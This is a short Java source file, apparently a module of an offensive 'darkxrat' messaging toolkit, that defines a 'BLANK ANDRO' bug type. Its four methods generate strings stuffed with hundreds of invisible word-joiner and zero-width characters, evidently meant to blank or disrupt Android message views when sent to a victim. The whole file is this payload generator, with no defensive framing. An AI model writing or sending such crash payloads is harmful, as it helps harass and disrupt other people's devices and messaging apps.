package com.darkxrat.mantax.func.bug;

public class BlankAndro {
    public static final String NAMA = "BLANK ANDRO";
    public static final String TIPE = "BUG";

    public static String func() {
        return "\u2060".repeat(50) + "BLANK_ANDRO" + "\u2060".repeat(50);
    }

    public static String funcHard() {
        return "\u2060".repeat(100) + "BLANK_ANDRO_HARD" + "\u2060".repeat(100);
    }

    public static String funcUltra() {
        return "\u2060".repeat(200) + "BLANK_ANDRO_ULTRA" + "\u2060".repeat(200);
    }

    public static String funcGacor() {
        return funcHard() + "\u200B" + funcUltra();
    }
}